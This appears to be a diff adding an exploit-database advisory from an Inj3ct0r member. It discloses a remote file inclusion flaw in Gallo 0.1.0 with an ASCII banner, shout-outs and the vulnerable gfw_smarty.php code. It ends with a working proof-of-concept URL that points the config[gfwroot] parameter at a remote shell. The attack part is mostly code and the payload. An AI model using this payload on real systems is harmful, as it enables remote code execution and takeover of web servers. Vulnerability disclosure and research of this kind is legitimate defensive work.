@@ -1,0 +1,64 @@
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+1                    ######################################            1
+0                    I'm cr4wl3r  member from Inj3ct0r Team            1
+1                    ######################################            0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   |    Gallo 0.1.0 Remote File Include Vulnerability   |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Homepage: http://h4ckb0x.org/
+[!] Download Script: http://sourceforge.net/projects/gallo/
+[!] Remote: yes
+
+[!] Greetz: All member inj3ct0r.com, manadocoding.net, sekuritionline.net, gcc.web.id
+[!] Thanks to: str0ke, opt!x hacker, xoron, cyberlog, irvian, antihack, angky.tatoki, 
+           EA ngel, zvtral, s4va, bL4Ck_3n91n3, untouch, team_elite, zreg, mywisdom, 
+           SENOT, devilbat, kec0a, d3viln3t, p4p4y, cybertomat, etaxCrew, emen, and all my friend
+
+[!] Code [gfw_smarty.php]:
+
+<?php
+/**
+ * @filename index.php
+ * @author Carlos Eduardo Sotelo Pinto
+ * @date 2009-01-08
+ */
+include ($config['gfwroot'] . 'libs/smarty/Smarty.class.php');
+class GfwSmarty extends Smarty {
+	function GfwSmarty () {
+		global $config;
+		$this->Smarty();
+
+		$this->template_dir  = $config['approot'] . 'sites/main/templates/';
+		$this->compile_dir   = $config['approot'] . 'compiles/';
+		$this->config_dir    = $config['approot'] . 'configs/';
+		$this->cache_dir     = $config['approot'] . 'cache/';
+		$this->compile_check = $config['compile'];
+		$this->force_compile = $config['compile'];
+		$this->caching       = $config['caching'];
+		$this->assign('app_name', 'Maps');
+	}
+}
+?>
+
+[!] PoC:
+
+[x] [Gallo_path]/core/includes/gfw_smarty.php?config[gfwroot]=[Shell]
